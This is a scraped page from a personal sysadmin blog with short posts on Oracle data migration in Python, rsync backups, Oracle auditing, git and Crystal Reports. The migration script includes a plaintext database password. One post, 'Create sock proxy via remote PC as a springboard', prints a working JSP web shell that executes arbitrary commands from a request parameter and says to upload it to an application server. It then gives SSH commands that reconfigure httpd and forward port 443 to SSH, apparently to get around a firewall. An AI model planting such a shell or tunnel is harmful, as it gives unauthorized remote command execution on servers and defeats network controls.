NEWS_ID,GROUP_ID,CREATION_DATE,PUBLISH_START_DATE,PUBLISH_END_DATE,NEWS_TITLE,NEWS_TITLE_CHI,STATUS,LAST_UPDATE,UPDATE_BY,UPDATE_ROLE,NEWS_TYPE,URL,URL_CHI,URL_SIMP_CHI,PRESS_RELEASE, NEWS_CONTENT from news &quot;)</span><br><span class="line">        res = dhprd_cur.fetchall()</span><br><span class="line"></span><br><span class="line">        for row in res:</span><br><span class="line">            cur = con.cursor()</span><br><span class="line">            print row[0]</span><br><span class="line">            NEWS_ID = row[0]</span><br><span class="line">            GROUP_ID = row[1]</span><br><span class="line">            CREATION_DATE = row[2]</span><br><span class="line">            PUBLISH_START_DATE = row[3]</span><br><span class="line">            PUBLISH_END_DATE = row[4]</span><br><span class="line">            NEWS_TITLE = row[5]</span><br><span class="line">            NEWS_TITLE_CHI = row[6]</span><br><span class="line">            STATUS = row[7]</span><br><span class="line">            LAST_UPDATE = row[8]</span><br><span class="line">            UPDATE_BY = row[9]</span><br><span class="line">            UPDATE_ROLE = row[10]</span><br><span class="line">            NEWS_TYPE = row[11]</span><br><span class="line">            URL = row[12]</span><br><span class="line">            URL_CHI = row[13]</span><br><span class="line">            URL_SIMP_CHI = row[14]</span><br><span class="line">            PRESS_RELEASE = row[15]</span><br><span class="line">            NEWS_CONTENT = row[16]</span><br><span class="line"></span><br><span class="line">            #cur.execute(&quot;insert into news(NEWS_ID,GROUP_ID,CREATION_DATE,PUBLISH_START_DATE,PUBLISH_END_DATE,NEWS_TITLE,NEWS_TITLE_CHI,STATUS,LAST_UPDATE,UPDATE_BY,UPDATE_ROLE,NEWS_TYPE,URL,URL_CHI,URL_SIMP_CHI,PRESS_RELEASE) values (:NEWS_ID,:GROUP_ID,:CREATION_DATE,:PUBLISH_START_DATE,:PUBLISH_END_DATE,:NEWS_TITLE,:NEWS_TITLE_CHI,:STATUS,:LAST_UPDATE,:UPDATE_BY,:UPDATE_ROLE,:NEWS_TYPE,:URL,:URL_CHI,:URL_SIMP_CHI,:PRESS_RELEASE)&quot;, &#123;&#x27;NEWS_ID&#x27; : NEWS_ID,&#x27;GROUP_ID&#x27; : GROUP_ID,&#x27;CREATION_DATE&#x27; : CREATION_DATE,&#x27;PUBLISH_START_DATE&#x27; : PUBLISH_START_DATE,&#x27;PUBLISH_END_DATE&#x27; : PUBLISH_END_DATE,&#x27;NEWS_TITLE&#x27; : NEWS_TITLE,&#x27;NEWS_TITLE_CHI&#x27; : NEWS_TITLE_CHI,&#x27;STATUS&#x27; : STATUS,&#x27;LAST_UPDATE&#x27; : LAST_UPDATE,&#x27;UPDATE_BY&#x27; : UPDATE_BY,&#x27;UPDATE_ROLE&#x27; : UPDATE_ROLE,&#x27;NEWS_TYPE&#x27; : NEWS_TYPE,&#x27;URL&#x27; : URL,&#x27;URL_CHI&#x27; : URL_CHI,&#x27;URL_SIMP_CHI&#x27; : URL_SIMP_CHI,&#x27;PRESS_RELEASE&#x27; : PRESS_RELEASE&#125;)</span><br><span class="line"></span><br><span class="line">            #cur.execute(&quot;update news set NEWS_CONTENT = :NEWS_CONTENT, NEWS_CONTENT_CHI = :NEWS_CONTENT_CHI where news_id = :news_id&quot;, &#123;&#x27;news_id&#x27;:NEWS_ID, &#x27;NEWS_CONTENT&#x27;:&#x27;aa&#x27;, &#x27;NEWS_CONTENT_CHI&#x27;:&#x27;bb&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">            #cur.execute(&quot;select NEWS_CONTENT from news where news_id = :news_id for update&quot;, &#123;&#x27;news_id&#x27;:NEWS_ID&#125;)</span><br><span class="line">            print NEWS_CONTENT.read()</span><br><span class="line">            &#x27;&#x27;&#x27;row2, = cur.fetchone()</span><br><span class="line">            print NEWS_CONTENT.read()</span><br><span class="line">            row2.write(NEWS_CONTENT.read())&#x27;&#x27;&#x27;</span><br><span class="line">            #con.commit()</span><br><span class="line">            cur.close()</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        dhprd_cur.close()</span><br><span class="line"></span><br><span class="line">    finally:</span><br><span class="line">        print &#x27;close connection&#x27;</span><br><span class="line">        con.close()</span><br><span class="line">        dhprd_con.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def insert_news_content():</span><br><span class="line">    dsn_tns = cx_Oracle.makedsn(&#x27;server&#x27;, 1521, service_name=&#x27;xxrac&#x27;)</span><br><span class="line">    con = cx_Oracle.connect(&#x27;user2&#x27;,&#x27;user2uat0675&#x27;,dsn_tns)</span><br><span class="line"></span><br><span class="line">    dhprd_dsn_tns = cx_Oracle.makedsn(&#x27;server2&#x27;, 1521, &#x27;prd&#x27;)</span><br><span class="line">    dhprd_con = cx_Oracle.connect(&#x27;user2&#x27;,&#x27;password&#x27;,dhprd_dsn_tns)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        dhprd_cur = dhprd_con.cursor()</span><br><span class="line">        dhprd_cur.execute(&quot;SELECT NEWS_ID from news order by NEWS_ID&quot;)</span><br><span class="line">        res = dhprd_cur.fetchall()</span><br><span class="line">        news_ids = []</span><br><span class="line">        for row in res:</span><br><span class="line">            news_ids.append(row[0])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        for NEWS_ID in news_ids:</span><br><span class="line">            dhprd_cur.execute(&quot;SELECT NEWS_ID, NEWS_CONTENT, NEWS_CONTENT_CHI from news where NEWS_ID = :NEWS_ID&quot;, &#123;&#x27;NEWS_ID&#x27;:NEWS_ID&#125;)</span><br><span class="line">            row = dhprd_cur.fetchone()</span><br><span class="line"></span><br><span class="line">            NEWS_ID = row[0]</span><br><span class="line">            NEWS_CONTENT = row[1].read()</span><br><span class="line">            NEWS_CONTENT_CHI = row[2].read()</span><br><span class="line"></span><br><span class="line">            cur = con.cursor()</span><br><span class="line"></span><br><span class="line">            print NEWS_ID</span><br><span class="line">            cur.execute(&#x27;select news_content, news_content_chi from news where news_id = :news_id for update&#x27;, &#123;&#x27;news_id&#x27;:NEWS_ID&#125;)</span><br><span class="line">            c1, c2 = cur.fetchone()</span><br><span class="line">            c1.open()</span><br><span class="line">            c1.trim()</span><br><span class="line">            c1.write(NEWS_CONTENT)</span><br><span class="line">            c1.close()</span><br><span class="line"></span><br><span class="line">            c2.open()</span><br><span class="line">            c2.trim()</span><br><span class="line">            c2.write(NEWS_CONTENT_CHI)</span><br><span class="line">            c2.close()</span><br><span class="line"></span><br><span class="line">        con.commit()</span><br><span class="line">        cur.close()</span><br><span class="line">        dhprd_cur.close()</span><br><span class="line"></span><br><span class="line">    finally:</span><br><span class="line">        print &#x27;close connection&#x27;</span><br><span class="line">        con.close()</span><br><span class="line">        dhprd_con.close()</span><br><span class="line"></span><br><span class="line">insert_news_content() </span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-rsync-in-aix" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-03-06T07:48:12.000Z"><a href="/2014/03/06/rsync-in-aix/">2014-03-06</a></time>
      
      
  
    <h1 class="title"><a href="/2014/03/06/rsync-in-aix/">rsync in aix</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li>Install popt-1.7-1.aix4.3.ppc.rpm &amp; rsync-2.5.4-3.aix5.1.ppc.rpm from <a target="_blank" rel="noopener" href="http://bullfreeware.com/">http://bullfreeware.com/</a></li>
<li>Check manual by rsync –help</li>
<li>Write shell script as below<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOGDIR=/usr/prod/logs</span><br><span class="line">LOGFILE=rsync.log</span><br><span class="line">startBackup() &#123;</span><br><span class="line">   echo &quot;****** Start backup now `date`&quot;</span><br><span class="line">   rsync -uptorgvlHaz -e &quot;ssh -i /home/user/.ssh/id_dsa&quot; /source_directory/* support@remote_server:/destination</span><br><span class="line">   echo &quot;****** Finish backup at `date`&quot;</span><br><span class="line">   echo &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">main() &#123;</span><br><span class="line"> startBackup</span><br><span class="line">&#125;</span><br><span class="line">main &amp;raquo; $LOGDIR/$LOGFILE 2&gt;&amp;1</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Refer to <a target="_blank" rel="noopener" href="http://www.mikerubel.org/computers/rsync_snapshots/">Easy Automated Snapshot-Style Backups with Linux and Rsync</a><br><a target="_blank" rel="noopener" href="http://www.jveweb.net/en/archives/2011/02/using-rsync-and-cron-to-automate-incremental-backups.html">Using rsync and cron to automate incremental backups</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Enable-audit-in-oracle" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-02-25T09:39:59.000Z"><a href="/2014/02/25/Enable-audit-in-oracle/">2014-02-25</a></time>
      
      
  
    <h1 class="title"><a href="/2014/02/25/Enable-audit-in-oracle/">Enable audit in oracle</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Check-audit-settting"><a href="#Check-audit-settting" class="headerlink" title="Check audit settting"></a>Check audit settting</h1><p><code>select name,value from v$parameter where name like &#39;audit%&#39;</code><br><code>show parameter audit;</code></p>
<h1 id="Change-setting-of-audit-trail"><a href="#Change-setting-of-audit-trail" class="headerlink" title="Change setting of audit_trail"></a>Change setting of audit_trail</h1><h2 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter system set audit_trail=DB,Extended scope=spfile (cannot set both as Change Static Parameters Through the SPFILE)</span><br><span class="line">alter system set audit_sys_operations=true scope=spfile</span><br></pre></td></tr></table></figure>

<h2 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h2><ul>
<li>add config in $ORACLE_HOME&#x2F;dbs&#x2F;init**.ora as below since db starting with pfile, error **’specified initialization parameter can not be modified’*</li>
<li>audit_trail&#x3D;DB ( oracle9i not support ‘Extended’ in init*.ora file)</li>
<li>audit_sys_operations&#x3D;true</li>
</ul>
<h1 id="Restart-db"><a href="#Restart-db" class="headerlink" title="Restart db"></a>Restart db</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shutdown immediate;</span><br><span class="line">startup;</span><br></pre></td></tr></table></figure>

<h1 id="Check-audit-option-in-db"><a href="#Check-audit-option-in-db" class="headerlink" title="Check audit option in db"></a>Check audit option in db</h1><p><code>select * from dba_stmt_audit_opts</code> OR <code>select * from dba_priv_audit_opts</code></p>
<h1 id="Make-some-audit-option"><a href="#Make-some-audit-option" class="headerlink" title="Make some audit option"></a>Make some audit option</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">AUDIT ALTER TABLE;</span><br><span class="line">AUDIT DELETE ANY TABLE;</span><br><span class="line">AUDIT DROP ANY TABLE;</span><br><span class="line">AUDIT AUDIT ANY;</span><br><span class="line">AUDIT AUDIT SYSTEM;</span><br><span class="line"></span><br><span class="line">AUDIT ALL BY FRED BY ACCESS;</span><br><span class="line">audit select table, update table, delete table,</span><br><span class="line">      insert table, execute procedure by FRED by access;</span><br><span class="line"></span><br><span class="line">AUDIT SELECT, INSERT, DELETE</span><br><span class="line">     ON jward.dept</span><br><span class="line">     BY ACCESS</span><br><span class="line">     WHENEVER SUCCESSFUL;</span><br><span class="line"></span><br><span class="line">AUDIT SELECT TABLE, INSERT TABLE, DELETE TABLE, EXECUTE PROCEDURE</span><br><span class="line">      BY ACCESS</span><br><span class="line">      WHENEVER NOT SUCCESSFUL;</span><br><span class="line"></span><br><span class="line">AUDIT SELECT, UPDATE, DELETE ON SYS.AUD$ BY ACCESS;</span><br><span class="line">-------- disable them</span><br><span class="line">NOAUDIT ALTER TABLE;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h1 id="List-audit-record"><a href="#List-audit-record" class="headerlink" title="List audit record"></a>List audit record</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from dba_audit_session order by timestamp desc</span><br><span class="line">select * from dba_audit_trail order by timestamp desc</span><br><span class="line">select * from dba_audit_object order by timestamp desc;</span><br><span class="line">select * from dba_audit_statement order by timestamp desc;</span><br></pre></td></tr></table></figure>

<h1 id="House-keep-sys-aud-to-reduce-its-size"><a href="#House-keep-sys-aud-to-reduce-its-size" class="headerlink" title="House keep sys.aud$ to reduce its size"></a>House keep sys.aud$ to reduce its size</h1><p><code>truncate sys.aud$</code> or <code>delete sys.aud$</code></p>
<h1 id="Trace-user’s-behavior"><a href="#Trace-user’s-behavior" class="headerlink" title="Trace user’s behavior"></a>Trace user’s behavior</h1><p><code>show parameter dump</code></p>
<ul>
<li>Find <strong>background_dump_dest</strong>&#x2F;alert_sid.log</li>
<li>This file would give you some info about user’s behavior in <strong>user_dump_dest</strong>&#x2F;sid_ora_pid.trc</li>
</ul>
<h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>A user Fred was missing someday in db, how to find out the reason. Follow these step</p>
<ul>
<li>check alert.log</li>
<li>check sid_ora_pid.trc</li>
<li>check dba_audit_session and dba_audit_trail</li>
</ul>
<p>Get the user’s role and privilege</p>
<ul>
<li>USER_SYS_PRIVS, USER_TAB_PRIVS, USER_ROLE_PRIVS</li>
<li>DBA_SYS_PRIVS, DBA_TAB_PRIVS, DBA_ROLE_PRIVS</li>
</ul>
<p><code>select * from DBA_role_privs</code></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>xming + putty + X11 forwarding<br>run $ORACLE_HOME&#x2F;bin&#x2F;dbca</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="http://www.dba-oracle.com/t_audit_table_command.htm">Oracle audit command tips</a><br><a target="_blank" rel="noopener" href="http://www.symantec.com/connect/articles/introduction-simple-oracle-auditing">Introduction to Simple Oracle Auditing</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B19306_01/network.102/b14266/cfgaudit.htm">Configuring and Administering Auditing</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B28359_01/server.111/b28337/tdpsg_auditing.htm#TDPSG50514">Auditing Database Activity</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B10500_01/server.920/a96521/audit.htm">Auditing Database Use</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B28359_01/network.111/b28531/auditing.htm">Verifying Security Access with Auditing</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B28359_01/server.111/b28310/start001.htm#ADMIN11147">Starting Up a Database</a><br><a target="_blank" rel="noopener" href="http://www.princeton.edu/~mrron/spfile_info.html">Spfile and Init.ora Parameter File Startup of an Oracle9i Instance</a><br><a target="_blank" rel="noopener" href="http://www.idevelopment.info/data/Oracle/DBA_tips/Database_Administration/DBA_38.shtml">Change Static Parameters Through the SPFILE</a><br><a target="_blank" rel="noopener" href="http://hi.baidu.com/sonmeika/item/7cc5f9311e8731b8633aff16">Oracle_9i_AUDIT_SOP</a><br><a target="_blank" rel="noopener" href="http://blog.roodo.com/mywork/archives/8493777.html">Oracle Audit 审计</a><br><a target="_blank" rel="noopener" href="http://docs.oracle.com/cd/B10501_01/server.920/a96521/privs.htm">Managing User Privileges and Roles</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-dive-into-git" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-02-25T09:34:46.000Z"><a href="/2014/02/25/dive-into-git/">2014-02-25</a></time>
      
      
  
    <h1 class="title"><a href="/2014/02/25/dive-into-git/">dive into git</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">git clone = svn co</span><br><span class="line">git remote show = svn info</span><br><span class="line">git branch + git checkout = git switch</span><br><span class="line"></span><br><span class="line">git clone = git init + git remote </span><br><span class="line"></span><br><span class="line">step:</span><br><span class="line">git init</span><br><span class="line">mkdir project.git</span><br><span class="line">cd project.git</span><br><span class="line">git remote add -f -t master -m master orgin git://example.com/git.git (or https://example.com/git.git)</span><br><span class="line">git merge origin</span><br><span class="line">touch file.txt</span><br><span class="line">git commit -m &#x27;test commit&#x27;</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git branch</span><br><span class="line">git checkout</span><br><span class="line">git rebase</span><br><span class="line">git reset --hard</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Pass-value-to-report-engine-via-prompt-dialog" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-02-06T02:16:40.000Z"><a href="/2014/02/06/Pass-value-to-report-engine-via-prompt-dialog/">2014-02-06</a></time>
      
      
  
    <h1 class="title"><a href="/2014/02/06/Pass-value-to-report-engine-via-prompt-dialog/">Pass value to report engine via prompt dialog</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>There are two mode that call to render a report template,<br>Crystal Report can be called with&#x2F;without paramter values to render a report template. When it is called without parameter, an input dialog will be prompted.<br>Those parameter values are serialized by JSON format, the parameter names are as following:</p>
<ul>
<li>CRVCompositeViewState</li>
<li>CRVEventTarget</li>
<li>CRVEventArgument</li>
</ul>
<p>It is found that a warning message <strong>the report requires parameter values that need to be supplied by the client before further processing”</strong> will be shown when values are entered.<br>So upset!!<br>I used <strong>curl</strong> to debug the program, found that parameter <strong>CRVCompositeViewState</strong> and <strong>CRVEventTarget</strong> would affect the result of putting paramter value to report.<br>No idea, to solve the problem, I used a ugly approach that removing parameter <strong>CRVCompositeViewState</strong> and <strong>CRVEventTarget</strong> in allInOne.js to let them not be passed to server side.</p>
<p>Reference<br><a target="_blank" rel="noopener" href="http://my.oschina.net/l1z2g9/blog/157279">升级Crystal Report 8.5 to Crystal Report 2011</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Create-sock-proxy-via-remote-PC-as-a-springboard" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-01-29T03:10:16.000Z"><a href="/2014/01/29/Create-sock-proxy-via-remote-PC-as-a-springboard/">2014-01-29</a></time>
      
      
  
    <h1 class="title"><a href="/2014/01/29/Create-sock-proxy-via-remote-PC-as-a-springboard/">Create sock proxy via remote PC as a springboard</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Install-cygwin-in-my-remote-PC"><a href="#Install-cygwin-in-my-remote-PC" class="headerlink" title="Install cygwin in my remote PC"></a>Install cygwin in my remote PC</h1><h1 id="Upload-a-console-jsp-to-application-server"><a href="#Upload-a-console-jsp-to-application-server" class="headerlink" title="Upload a console.jsp to application server"></a>Upload a console.jsp to application server</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.io.*&quot; %&gt;</span><br><span class="line">  &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">  $(function()&#123;</span><br><span class="line">    $(&quot;#command&quot;).focus();</span><br><span class="line">    var cmd = &#x27;&lt;%=request.getParameter(&quot;command&quot;)%&gt;&#x27;;</span><br><span class="line">    $(&quot;#command&quot;).val(cmd == &#x27;null&#x27; ? &#x27;&#x27; : cmd);</span><br><span class="line">  &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;body bgcolor=&quot;#cdc0cd&quot;&gt;</span><br><span class="line">  &lt;form action=&quot;console.jsp&quot;&gt;</span><br><span class="line">    Command: &lt;textarea name=&quot;command&quot; rows=&quot;10&quot; cols=&quot;50&quot; id=&quot;command&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;/&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%</span><br><span class="line">  String cmd = request.getParameter(&quot;command&quot;);</span><br><span class="line">  if(cmd != null &amp;&amp; cmd.length() &gt; 0)&#123;</span><br><span class="line">    //Runtime.getRuntime().exec(cmd);</span><br><span class="line">    out.println(&quot;command = &quot; + cmd + &quot;&lt;p&gt;&lt;p&gt;&quot;);</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    String s = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">        BufferedReader stdInput = new BufferedReader(new</span><br><span class="line">             InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">        BufferedReader stdError = new BufferedReader(new</span><br><span class="line">             InputStreamReader(p.getErrorStream()));</span><br><span class="line"></span><br><span class="line">        out.print(&quot;&lt;h2&gt;result as below&lt;/h2&gt;&quot;);</span><br><span class="line">        while ((s = stdInput.readLine()) != null) &#123;</span><br><span class="line">            sb.append(s+&quot;&lt;br/&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // read any errors from the attempted command</span><br><span class="line">        sb.append(&quot;&lt;hr&gt;&lt;h2&gt;error as below(if any)&lt;/h2&gt;&quot;);</span><br><span class="line">        while ((s = stdError.readLine()) != null) &#123;</span><br><span class="line">            sb.append(s);</span><br><span class="line">        &#125;</span><br><span class="line">            out.print(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    catch (IOException e) &#123;</span><br><span class="line">        sb.append(&quot;exception happened - here&#x27;s what I know: &quot;);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  %&gt;</span><br></pre></td></tr></table></figure>

<h1 id="Disable-port-443-in-httpd"><a href="#Disable-port-443-in-httpd" class="headerlink" title="Disable port 443 in httpd"></a>Disable port 443 in httpd</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/443-hide.bat</span><br><span class="line">copy &quot;C:\Program Files\IBM\HTTPServer\conf\httpd.conf&quot; &quot;C:\Users\xx\Downloads\fw\httpd-latest.conf&quot;</span><br><span class="line">copy &quot;C:\Users\xx\Downloads\fw\httpd2.conf&quot; &quot;C:\Program Files\IBM\HTTPServer\conf\httpd.conf&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/restart.bat </span><br><span class="line">net stop IBMHTTPServer7.0</span><br><span class="line">net start IBMHTTPServer7.0</span><br></pre></td></tr></table></figure>

<h1 id="Forward-port-443-to-22"><a href="#Forward-port-443-to-22" class="headerlink" title="Forward port 443 to 22"></a>Forward port 443 to 22</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa xx@server /cygdrive/c/Users/xx/fw/443-open.bat </span><br><span class="line">rem wscript.exe C:\Users\xx\Downloads\fw\443-open.vbs C:\Users\xx\Downloads\plink.exe -load local -N &lt;span style=&quot;font-size:12.5px;line-height:1.5;&quot;&gt;&lt;/span&gt;  5. Stop process plink</span><br><span class="line">tasklist|grep plink</span><br><span class="line">taskkill /f /pid 7944</span><br></pre></td></tr></table></figure>

<h1 id="Enable-port-443-in-httpd"><a href="#Enable-port-443-in-httpd" class="headerlink" title="Enable port 443 in httpd"></a>Enable port 443 in httpd</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/443-show.bat</span><br><span class="line">copy &quot;C:\Users\xx\Downloads\fw\httpd-latest.conf&quot; &quot;C:\Program Files\IBM\HTTPServer\conf\httpd.conf&quot;</span><br></pre></td></tr></table></figure>

<h1 id="See-config-in-httpd"><a href="#See-config-in-httpd" class="headerlink" title="See config in httpd"></a>See config in httpd</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/cat-httpd.bat</span><br><span class="line">copy &quot;C:\Users\xx\Downloads\fw\httpd-latest.conf&quot; &quot;C:\Program Files\IBM\HTTPServer\conf\httpd.conf&quot;</span><br></pre></td></tr></table></figure>

<h1 id="Make-it-effective"><a href="#Make-it-effective" class="headerlink" title="Make it effective"></a>Make it effective</h1><p><code>ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/restart.bat</code></p>
<h1 id="Fallback-a-backup-version"><a href="#Fallback-a-backup-version" class="headerlink" title="Fallback a backup version"></a>Fallback a backup version</h1><p><code>ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/443-fallback.bat</code></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Make-my-home&#39;s-PC-as-proxy-server-to-surf-internet" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2014-01-21T09:52:15.000Z"><a href="/2014/01/21/Make-my-home's-PC-as-proxy-server-to-surf-internet/">2014-01-21</a></time>
      
      
  
    <h1 class="title"><a href="/2014/01/21/Make-my-home's-PC-as-proxy-server-to-surf-internet/">Make my home&#39;s PC as proxy server to surf internet</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
